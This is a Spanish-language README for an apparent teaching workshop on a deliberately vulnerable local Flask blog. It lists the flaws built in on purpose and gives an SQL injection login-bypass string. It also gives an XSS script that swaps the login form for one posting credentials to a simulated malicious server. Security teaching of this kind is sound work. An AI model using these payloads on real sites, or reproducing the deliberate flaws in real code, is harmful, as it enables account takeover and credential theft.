# TallerCiberseguridad

Este taller pretende mostrar con ejemplos algunas técnicas usadas para explotar debilidades de seguridad, concretamente en qué consiste el **SQLInjection** y el **Cross Site Scripting**.

# Advertencia:

Con la finalidad de mostrar estos datos, hemos recurrido a varias irregularidades en el código, como pueden ser:

* No escapar el texto que nos llega en una petición (a través del cual luego haremos **XSS**).
* Componer la query **SQL** concatenando textos, en lugar de hacer uso de los **prepared statements**.
* No estamos cifrando las claves de los usuarios en las bases de datos.
* La conexión a la base de datos hace uso de usuario y contraseña, hardcodeados en el código.
* Hemos subido a un repositorio público el **secret** de nuestra aplicación.

# Dependencias

Vienen indicadas en el fichero **requirements**, son los módulos **flask** y **pymysql**. Puedes instalarlos con **pip**

```bash 
pip install flask
pip install pymysql
``` 

# Preparación

Se necesita una base de datos MySQL en local, con usuario **root** con contraseña **root** (podemos usar otra base de datos y/o usuario, contraseña, siempre que lo modifiquemos en el código), sobre la que ejecutaremos el siguiente código:

```sql
create database usuarios
create table usuarios (email varchar(64), clave varchar(32), created timestamp default CURRENT_TIMESTAMP, primary key (email));
insert into usuarios (email, clave) values ('misterio@raro.sa','123abc');
insert into usuarios (email, clave) values ('vegeta@gmail.com','777');
``` 

# Desarrollo

## 1- Levantar el servidor 

Ejecutamos el proceso **ServerBlog.py**. Para ello la base de datos debe estar corriendo.

## 2- Mostrar la página

Se muestra el uso general de la página, que obliga a hacer login para poder publicar comentario.

Existen dos usuarios, usaremos el usuario **vegeta@gmail.com** con contraseña **777** para mostrar que se puede publicar un comentario.

## 3- Ahora nos saltamos la seguridad

Posteriormente nos conectaremos como otro usuario cuya contraseña (supuestamente) no conocemos, el usuario **misterio@raro.sa** y como contraseña realizaremos el **SQLInjection**. Para ello escribiremos lo siguiente como contraseña:

```sql
' or 1=1  -- '
``` 

## 4- Y ahora nos toca robar datos

Ejecutamos el segundo servidor, **fakeServer.py**. Esto simula ser un servidor maligno creado para robar datos.

Nos autenticamos usando lo visto en el punto anterior, y añadimos un comentario haciendo uso de una vulnerabilidad de *XSS*.

```html
<script type="text/javascript">
var temp = document.getElementById("loginFrame");
delete temp.src;
temp.srcdoc='<!DOCTYPE html><html lang="en"><head>    <meta charset="UTF-8">    <title>Cutre Login</title></head><body><form action="http://127.0.0.1:5005/validateLogin" id="formLogin" method="POST">  <label for="user">user:</label>  <input type="text" id="user" name="user"><br><br>  <label for="pass">pass:</label>  <input type="password" id="pass" name="pass"><br><br>  <input type="submit" value="Submit"></form></body></html>';
</script>
``` 

Al hacerlo, sin que se vea en el código fuente, hemos cambaido el formulario de login, para hacer que apunte a nuestro servidor maligno. 

Intentamos logarnos con unos datos cualquiera, y mostramos cómo el servidor maligno ha capturado los datos.



